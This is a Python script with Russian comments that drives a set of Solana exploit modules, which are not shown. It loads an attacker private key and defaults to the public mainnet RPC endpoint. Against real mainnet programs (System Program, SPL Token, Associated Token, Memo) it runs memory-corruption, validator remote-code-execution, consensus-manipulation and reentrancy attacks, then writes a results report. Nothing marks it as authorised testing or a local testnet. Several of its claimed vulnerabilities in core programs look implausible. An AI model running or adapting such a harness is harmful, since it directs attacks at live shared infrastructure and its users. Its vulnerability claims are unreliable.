"""
Комплексное тестирование продвинутых эксплойтов Solana
Тестирует memory corruption, validator RCE и reentrancy атаки
"""

import asyncio
import os
import sys
import logging
from datetime import datetime
from typing import Dict, List, Any
from pathlib import Path

# Добавляем путь к модулям
sys.path.insert(0, str(Path(__file__).parent.parent))

from dotenv import load_dotenv
from solders.keypair import Keypair
from solders.pubkey import Pubkey as PublicKey
from solana.rpc.async_api import AsyncClient
from solana.rpc.commitment import Commitment

from src.exploits.memory_exploit import MemoryExploit, MemoryExploitConfig, MemoryVulnerability, MemoryRegion, CellExploitPayload
from src.exploits.validator_exploit import ValidatorExploit, ValidatorExploitConfig, ValidatorVulnerability
from src.exploits.reentrancy_exploit import ReentrancyExploit
from src.exploits.base_exploit import ExploitStatus

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('advanced_exploits_test.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class AdvancedExploitTester:
    """Тестер продвинутых эксплойтов Solana"""
    
    def __init__(self):
        load_dotenv()
        
        # Загружаем конфигурацию
        self.rpc_url = os.getenv('SOLANA_RPC_URL', 'https://api.mainnet.solana.com')
        self.private_key = os.getenv('SOLANA_PRIVKEY')
        
        if not self.private_key:
            raise ValueError("SOLANA_PRIVKEY не найден в .env")
        
        # Создаем keypair из приватного ключа
        private_bytes = bytes.fromhex(self.private_key)
        self.attacker_keypair = Keypair.from_bytes(private_bytes)
        
        logger.info(f"Инициализация тестера с адресом: {self.attacker_keypair.pubkey()}")
        
        # RPC клиент
        self.client = AsyncClient(
            self.rpc_url,
            commitment=Commitment("confirmed")
        )
        
        # Результаты тестов
        self.test_results = {
            'memory_exploits': [],
            'validator_exploits': [],
            'reentrancy_exploits': [],
            'summary': {}
        }
    
    async def test_memory_exploits(self, target_accounts: List[str]) -> Dict[str, Any]:
        """Тестирование memory corruption эксплойтов"""
        logger.info("=== Начало тестирования Memory Exploits ===")
        
        memory_exploit = MemoryExploit(self.client, self.attacker_keypair)
        results = []
        
        for target_str in target_accounts:
            try:
                target = PublicKey.from_string(target_str)
                logger.info(f"\nТестирование memory exploits для {target}")
                
                # 1. Сканирование уязвимостей
                vulnerabilities = await memory_exploit.scan_memory_vulnerabilities(target)
                logger.info(f"Найдено уязвимостей: {len(vulnerabilities)}")
                
                # 2. Тест Cell<u64> arbitrary read/write
                if MemoryVulnerability.ARBITRARY_READ_WRITE_CELL in vulnerabilities:
                    logger.info("Тестирование Cell<u64> arbitrary read/write...")
                    
                    config = MemoryExploitConfig(
                        target_account=target,
                        vulnerability_type=MemoryVulnerability.ARBITRARY_READ_WRITE_CELL,
                        cell_payload=CellExploitPayload(
                            target_cell_offset=0x100,
                            new_value=0xdeadbeaf,
                            cell_type="u64",
                            bypass_borrow_check=True
                        )
                    )
                    
                    result = await memory_exploit.exploit_arbitrary_readwrite(config)
                    results.append({
                        'target': str(target),
                        'exploit': 'cell_arbitrary_rw',
                        'status': result.status.value,
                        'details': result.__dict__
                    })
                
                # 3. Тест guest address validation bypass
                if MemoryVulnerability.MEMORY_REGION_GUEST_CHECK in vulnerabilities:
                    logger.info("Тестирование guest address validation bypass...")
                    
                    config = MemoryExploitConfig(
                        target_account=target,
                        vulnerability_type=MemoryVulnerability.MEMORY_REGION_GUEST_CHECK,
                        target_vm_addr=0x400000,
                        bypass_guest_check=True,
                        memory_regions=[
                            MemoryRegion(
                                host_addr=0x400000,
                                vm_addr=0x400000,
                                len=0x1000,
                                is_writable=True
                            )
                        ]
                    )
                    
                    result = await memory_exploit.exploit_guest_address_validation_bypass(config)
                    results.append({
                        'target': str(target),
                        'exploit': 'guest_validation_bypass',
                        'status': result.status.value,
                        'details': result.__dict__
                    })
                
            except Exception as e:
                logger.error(f"Ошибка тестирования memory exploit для {target_str}: {e}")
                results.append({
                    'target': target_str,
                    'exploit': 'memory_scan',
                    'status': 'error',
                    'error': str(e)
                })
        
        self.test_results['memory_exploits'] = results
        return results
    
    async def test_validator_exploits(self, validator_endpoints: List[str]) -> Dict[str, Any]:
        """Тестирование validator RCE эксплойтов"""
        logger.info("\n=== Начало тестирования Validator Exploits ===")
        
        validator_exploit = ValidatorExploit(self.client, self.attacker_keypair)
        results = []
        
        for endpoint in validator_endpoints:
            try:
                logger.info(f"\nТестирование validator exploits для {endpoint}")
                
                # 1. Сканирование уязвимостей
                vulnerabilities = await validator_exploit.scan_validator_vulnerabilities(endpoint)
                logger.info(f"Найдено уязвимостей: {len(vulnerabilities)}")
                
                # 2. Тест RCE vulnerability
                if ValidatorVulnerability.RCE_VULNERABILITY in vulnerabilities:
                    logger.info("Тестирование RCE vulnerability...")
                    
                    config = ValidatorExploitConfig(
                        target_validator=endpoint,
                        vulnerability_type=ValidatorVulnerability.RCE_VULNERABILITY,
                        rpc_endpoint=endpoint
                    )
                    
                    result = await validator_exploit.exploit_rce_vulnerability(config)
                    results.append({
                        'target': endpoint,
                        'exploit': 'rce_vulnerability',
                        'status': result.status.value,
                        'details': result.__dict__
                    })
                
                # 3. Тест consensus manipulation
                if ValidatorVulnerability.CONSENSUS_MANIPULATION in vulnerabilities:
                    logger.info("Тестирование consensus manipulation...")
                    
                    config = ValidatorExploitConfig(
                        target_validator=endpoint,
                        vulnerability_type=ValidatorVulnerability.CONSENSUS_MANIPULATION,
                        rpc_endpoint=endpoint,
                        consensus_attack=True
                    )
                    
                    result = await validator_exploit.exploit_consensus_manipulation(config)
                    results.append({
                        'target': endpoint,
                        'exploit': 'consensus_manipulation',
                        'status': result.status.value,
                        'details': result.__dict__
                    })
                
            except Exception as e:
                logger.error(f"Ошибка тестирования validator exploit для {endpoint}: {e}")
                results.append({
                    'target': endpoint,
                    'exploit': 'validator_scan',
                    'status': 'error',
                    'error': str(e)
                })
        
        self.test_results['validator_exploits'] = results
        return results
    
    async def test_reentrancy_exploits(self, target_programs: List[str]) -> Dict[str, Any]:
        """Тестирование reentrancy эксплойтов"""
        logger.info("\n=== Начало тестирования Reentrancy Exploits ===")
        
        reentrancy_exploit = ReentrancyExploit(self.client, self.attacker_keypair)
        results = []
        
        for program_str in target_programs:
            try:
                program = PublicKey.from_string(program_str)
                logger.info(f"\nТестирование reentrancy exploits для {program}")
                
                # 1. Сканирование на уязвимости
                scan_result = await reentrancy_exploit.scan_target(program)
                logger.info(f"Программа уязвима: {scan_result.get('vulnerable', False)}")
                
                if scan_result.get('vulnerable'):
                    vulnerabilities = scan_result.get('vulnerabilities', [])
                    logger.info(f"Найдено уязвимостей: {len(vulnerabilities)}")
                    
                    # 2. Подготовка эксплойта
                    prepared = await reentrancy_exploit.prepare_exploit(program)
                    
                    if prepared:
                        # 3. Выполнение эксплойта
                        result = await reentrancy_exploit.execute_exploit(program)
                        results.append({
                            'target': str(program),
                            'exploit': 'reentrancy',
                            'status': result.status.value,
                            'details': result.__dict__
                        })
                        
                        # 4. Продвинутая атака
                        advanced_result = await reentrancy_exploit.advanced_reentrancy_attack(program, max_depth=5)
                        results.append({
                            'target': str(program),
                            'exploit': 'advanced_reentrancy',
                            'status': advanced_result.status.value,
                            'details': advanced_result.__dict__
                        })
                    else:
                        results.append({
                            'target': str(program),
                            'exploit': 'reentrancy_prepare',
                            'status': 'failed',
                            'error': 'Failed to prepare exploit'
                        })
                else:
                    results.append({
                        'target': str(program),
                        'exploit': 'reentrancy_scan',
                        'status': 'not_vulnerable',
                        'details': scan_result
                    })
                    
            except Exception as e:
                logger.error(f"Ошибка тестирования reentrancy exploit для {program_str}: {e}")
                results.append({
                    'target': program_str,
                    'exploit': 'reentrancy_scan',
                    'status': 'error',
                    'error': str(e)
                })
        
        self.test_results['reentrancy_exploits'] = results
        return results
    
    def generate_report(self) -> str:
        """Генерация отчета о тестировании"""
        report = f"""
# Advanced Exploits Test Report
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## Summary
- Memory Exploits Tested: {len(self.test_results['memory_exploits'])}
- Validator Exploits Tested: {len(self.test_results['validator_exploits'])}
- Reentrancy Exploits Tested: {len(self.test_results['reentrancy_exploits'])}

## Memory Exploits Results
"""
        
        for result in self.test_results['memory_exploits']:
            report += f"\n### Target: {result['target']}\n"
            report += f"- Exploit: {result['exploit']}\n"
            report += f"- Status: {result['status']}\n"
            if 'error' in result:
                report += f"- Error: {result['error']}\n"
        
        report += "\n## Validator Exploits Results\n"
        
        for result in self.test_results['validator_exploits']:
            report += f"\n### Target: {result['target']}\n"
            report += f"- Exploit: {result['exploit']}\n"
            report += f"- Status: {result['status']}\n"
            if 'error' in result:
                report += f"- Error: {result['error']}\n"
        
        report += "\n## Reentrancy Exploits Results\n"
        
        for result in self.test_results['reentrancy_exploits']:
            report += f"\n### Target: {result['target']}\n"
            report += f"- Exploit: {result['exploit']}\n"
            report += f"- Status: {result['status']}\n"
            if 'error' in result:
                report += f"- Error: {result['error']}\n"
        
        return report
    
    async def run_all_tests(self):
        """Запуск всех тестов"""
        logger.info("Начало комплексного тестирования продвинутых эксплойтов Solana")
        
        # Тестовые цели
        test_accounts = [
            "11111111111111111111111111111111",  # System Program
            "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",  # SPL Token
        ]
        
        validator_endpoints = [
            self.rpc_url
        ]
        
        test_programs = [
            "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",  # Associated Token
            "Memo1UhkJRfHyvLMcVucJwxXeuD728EqVDDwQDxFMNo",  # Memo Program
        ]
        
        # Запуск тестов
        await self.test_memory_exploits(test_accounts)
        await self.test_validator_exploits(validator_endpoints)
        await self.test_reentrancy_exploits(test_programs)
        
        # Генерация отчета
        report = self.generate_report()
        
        # Сохранение отчета
        with open('advanced_exploits_test_report.md', 'w', encoding='utf-8') as f:
            f.write(report)
        
        logger.info("Тестирование завершено. Отчет сохранен в advanced_exploits_test_report.md")
        
        # Закрытие соединения
        await self.client.close()

async def main():
    """Главная функция"""
    tester = AdvancedExploitTester()
    await tester.run_all_tests()

if __name__ == "__main__":
    asyncio.run(main())
